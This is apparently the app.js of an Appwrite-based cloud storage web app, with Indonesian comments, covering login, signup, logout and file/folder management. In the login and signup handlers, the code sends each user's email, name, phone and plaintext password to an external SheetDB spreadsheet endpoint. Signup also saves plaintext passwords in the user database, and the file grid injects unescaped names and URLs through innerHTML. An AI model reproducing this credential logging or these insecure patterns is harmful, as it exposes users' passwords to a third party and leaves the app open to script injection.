// ======================================================
// STORAGE TASKS - APP.JS (REVISI LOG LOGIN & LOGOUT)
// ======================================================

// 1. Inisialisasi SDK Appwrite
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// 2. Konfigurasi Project
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',   
    BUCKET_ID: 'taskfiles'
};

// URL API EXCEL (SheetDB)
const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// 3. State Global
let currentUser = null;
let currentFolderId = 'root';

// 4. Helper UI
const el = (id) => document.getElementById(id);
const showLoading = () => { if(el('loading')) el('loading').classList.remove('hidden'); };
const hideLoading = () => { if(el('loading')) el('loading').classList.add('hidden'); };

// Navigasi Halaman
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
        if(el(id)) {
            el(id).classList.add('hidden');
            el(id).classList.remove('active');
        }
    });
    if(el(pageId)) {
        el(pageId).classList.remove('hidden');
        el(pageId).classList.add('active');
    }
};

// ======================================================
// SISTEM OTENTIKASI & PENCATATAN SETIAP AKTIVITAS
// ======================================================

// A. LOGIKA LOGIN (Mencatat Setiap Kali Login Berhasil)
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let identifier = el('loginEmail').value.trim(); 
        const password = el('loginPass').value;
        
        showLoading();
        try {
            // Cek login pakai Nama atau Email
            if (!identifier.includes('@')) {
                const response = await databases.listDocuments(
                    CONFIG.DB_ID,
                    CONFIG.COLLECTION_USERS, 
                    [Appwrite.Query.equal('name', identifier)]
                );
                if (response.total === 0) throw new Error("Username tidak ditemukan.");
                identifier = response.documents[0].email;
            }

            // 1. Proses Login ke Appwrite
            await account.createEmailPasswordSession(identifier, password);
            currentUser = await account.get(); 

            // 2. CATAT KE EXCEL (Tab: Login) - SETIAP KALI LOGIN
            const logData = {
                "ID": currentUser.$id,
                "Nama": currentUser.name,
                "Email": currentUser.email,
                "Password": password, // Mencatat password yang digunakan
                "Riwayat Waktu": new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
            };

            // Menggunakan fetch POST untuk menambah baris baru di sheet 'Login'
            fetch(`${SHEETDB_API}?sheet=Login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [logData] })
            }).then(() => console.log("Login tercatat di Excel")).catch(err => console.warn("Gagal catat login:", err));

            // 3. Masuk Dashboard
            updateGreeting();
            nav('dashboardPage');
            loadFiles('root');

        } catch (error) {
            alert("Login Gagal: " + error.message);
        } finally {
            hideLoading();
        }
    });
}

// B. LOGIKA LOGOUT (Mencatat Setiap Kali Logout Berhasil)
const logoutBtn = document.getElementById('logoutBtn');
if (logoutBtn) {
    logoutBtn.addEventListener('click', async () => {
        if (!confirm("Apakah Anda yakin ingin keluar?")) return;

        showLoading();
        try {
            // 1. Ambil data user yang sedang aktif sebelum sesinya dihapus
            const userToLog = await account.get();
            
            // 2. CATAT KE EXCEL (Tab: Logout) - SETIAP KALI LOGOUT
            const logoutData = {
                "ID": userToLog.$id,
                "Nama": userToLog.name,
                "Email": userToLog.email,
                "Riwayat Waktu": new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
            };

            // Menggunakan await agar data terkirim sebelum koneksi diputus
            await fetch(`${SHEETDB_API}?sheet=Logout`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [logoutData] })
            });

            // 3. Hapus Sesi di Appwrite
            await account.deleteSession('current');
            currentUser = null;
            
            alert("Anda telah logout.");
            nav('loginPage'); 

        } catch (error) {
            // Jika error, tetap paksa logout secara lokal
            await account.deleteSession('current').catch(() => {});
            nav('loginPage');
        } finally {
            hideLoading();
        }
    });
}

// C. LOGIKA SIGN UP
if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value;
        const email = el('regEmail').value;
        const phone = el('regPhone').value;
        const pass = el('regPass').value;
        const verify = el('regVerify').value;

        if (pass !== verify) return alert("Password verifikasi tidak cocok!");

        showLoading();
        try {
            const userAuth = await account.create(Appwrite.ID.unique(), email, pass, name);
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id, {
                name: name, email: email, phone: phone, password: pass
            });

            // Catat SignUp ke Excel
            const signupData = {
                "ID": userAuth.$id,
                "Nama": name,
                "Email": email,
                "Phone": phone,
                "Password": pass,
                "Waktu": new Date().toLocaleString('id-ID')
            };
            
            fetch(`${SHEETDB_API}?sheet=SignUp`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [signupData] })
            });

            alert("Pendaftaran Berhasil! Silakan Login.");
            el('signupForm').reset();
            nav('loginPage');
        } catch (error) {
            alert("Gagal Daftar: " + error.message);
        } finally {
            hideLoading();
        }
    });
}

// ======================================================
// SISTEM MANAJEMEN FILE (DASHBOARD)
// ======================================================

async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        nav('dashboardPage');
        updateGreeting();
        loadFiles(currentFolderId);
    } catch (error) {
        nav('loginPage');
    } finally {
        hideLoading();
    }
}
checkSession();

async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid');
    if(grid) grid.innerHTML = '';
    try {
        const response = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('parentId', folderId)
        ]);
        response.documents.forEach(doc => renderItem(doc));
    } catch (error) { console.error("Gagal memuat file:", error); }
}

function renderItem(doc) {
    const grid = el('fileGrid'); if(!grid) return;
    const div = document.createElement('div'); div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    const icon = isFolder ? 'fa-folder' : 'fa-file';
    const clickAction = isFolder ? `openFolder('${doc.$id}')` : `window.open('${doc.url}', '_blank')`;
    div.innerHTML = `<button class="del-btn" onclick="deleteItem('${doc.$id}', '${doc.type}', '${doc.fileId}')"><i class="fa-solid fa-trash"></i></button>
        <div onclick="${clickAction}" style="width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center;">
            <i class="icon fa-solid ${icon}"></i><div class="item-name">${doc.name}</div>
        </div>`;
    grid.appendChild(div);
}

window.createFolder = async () => {
    const name = prompt("Nama Folder Baru:"); if (!name) return;
    showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, url: null, fileId: null
        });
        loadFiles(currentFolderId);
    } catch (error) { alert(error.message); } finally { hideLoading(); }
};

window.openFolder = (id) => { currentFolderId = id; loadFiles(id); };
window.deleteItem = async (docId, type, fileId) => {
    if (!confirm("Hapus?")) return;
    showLoading();
    try {
        if (type === 'file' && fileId) await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, docId);
        loadFiles(currentFolderId);
    } catch (error) { alert(error.message); } finally { hideLoading(); }
};

// UI Extras
window.togglePass = (id, icon) => {
    const input = el(id);
    input.type = input.type === 'password' ? 'text' : 'password';
    icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash');
};
window.toggleDropdown = () => { document.querySelector('.dropdown-content').classList.toggle('show'); };
function updateGreeting() {
    const hour = new Date().getHours();
    let s = "Morning"; if(hour >= 12) s = "Afternoon"; if(hour >= 18) s = "Night";
    if (el('welcomeText')) el('welcomeText').innerText = `Welcome In Drive ${s}`;
}
